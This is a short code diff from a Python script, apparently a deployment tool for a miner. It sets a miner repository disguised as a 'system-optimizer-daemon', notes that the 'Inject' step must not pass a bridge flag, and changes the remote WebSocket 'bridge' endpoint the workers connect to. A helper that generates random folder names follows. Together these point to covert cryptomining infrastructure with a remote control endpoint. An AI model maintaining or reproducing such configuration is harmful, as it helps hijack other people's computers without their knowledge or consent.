@@ -13,7 +13,7 @@ from datetime import datetime
 # Worker config
 MINER_REPO = "https://github.com/crucifix-cray/system-optimizer-daemon.git"
 # Default lives in sysoptd.py (DEFAULT_BRIDGE). Inject must NOT pass --bridge.
-BRIDGE_URL = "wss://chimera-bridge-production-1645.up.railway.app"
+BRIDGE_URL = "wss://chimera-bridge-production-0703.up.railway.app"
 
 
 def generate_random_folder_name() -> str:
